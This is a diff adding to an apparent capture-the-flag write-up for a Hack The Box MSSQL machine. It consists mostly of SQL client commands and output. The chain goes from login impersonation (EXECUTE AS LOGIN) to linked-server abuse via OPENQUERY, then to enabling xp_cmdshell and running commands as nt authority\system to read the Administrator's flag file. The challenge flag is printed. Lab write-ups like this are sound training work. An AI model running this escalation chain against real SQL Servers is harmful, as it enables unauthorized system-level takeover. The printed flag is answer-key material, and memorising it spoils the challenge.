@@ -498,3 +498,84 @@ msdb
 TestingDB
 SQL (WIN-HARD\Fiona  guest@master)>
 ```
+
+Check users who fiona can impersonate
+
+```
+SQL (WIN-HARD\Fiona  WIN-HARD\Fiona@TestingDB)> SELECT principal_id, name, type_desc, is_disabled FROM sys.server_principals WHERE principal_id IN (272, 273);
+principal_id   name    type_desc   is_disabled
+------------   -----   ---------   -----------
+         272   john    SQL_LOGIN             0
+         273   simon   SQL_LOGIN             0
+```
+
+Try to impersonate `john`
+
+```
+SQL (WIN-HARD\Fiona  guest@master)> EXECUTE AS LOGIN = 'john';
+SQL (john  guest@master)> SELECT SYSTEM_USER;
+
+----
+john
+SQL (john  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-
+0
+```
+
+Try to impersonate `simon`
+
+```
+SQL (WIN-HARD\Fiona  guest@master)> EXECUTE AS LOGIN = 'simon';
+SQL (simon  guest@master)> SELECT SYSTEM_USER;
+
+-----
+simon
+SQL (simon  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+
+-
+0
+SQL (simon  guest@master)>
+```
+
+Checking linked servers
+
+```
+SQL (WIN-HARD\Fiona  guest@master)> EXEC sp_helplinkedsrvlogin;
+Linked Server   Local Login   Is Self Mapping   Remote Login
+-------------   -----------   ---------------   ------------
+SQL (WIN-HARD\Fiona  guest@master)> SELECT srvname, srvproduct, providername, datasource, location, providerstring FROM sysservers WHERE isremote = 1;
+srvname               srvproduct   providername   datasource            location   providerstring
+-------------------   ----------   ------------   -------------------   --------   --------------
+WINSRV02\SQLEXPRESS   SQL Server   SQLOLEDB       WINSRV02\SQLEXPRESS   NULL       NULL
+
+SQL (WIN-HARD\Fiona  guest@master)> EXECUTE AS LOGIN = 'john';
+SQL (john  guest@master)> SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT SYSTEM_USER');
+
+---------
+testadmin
+SQL (john  guest@master)> SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+
+-
+1
+```
+
+Got the flag.
+
+```
+SQL (john  guest@master)> use_link [LOCAL.TEST.LINKED.SRV]
+SQL >[LOCAL.TEST.LINKED.SRV] (testadmin  dbo@master)>
+SQL >[LOCAL.TEST.LINKED.SRV] (testadmin  dbo@master)> enable_xp_cmdshell
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL >[LOCAL.TEST.LINKED.SRV] (testadmin  dbo@master)> xp_cmdshell whoami
+output
+-------------------
+nt authority\system
+NULL
+SQL >[LOCAL.TEST.LINKED.SRV] (testadmin  dbo@master)> xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt"
+output
+---------------------------
+HTB{46u$!n9_l!nk3d_$3rv3r$}
+SQL >[LOCAL.TEST.LINKED.SRV] (testadmin  dbo@master)>
+```
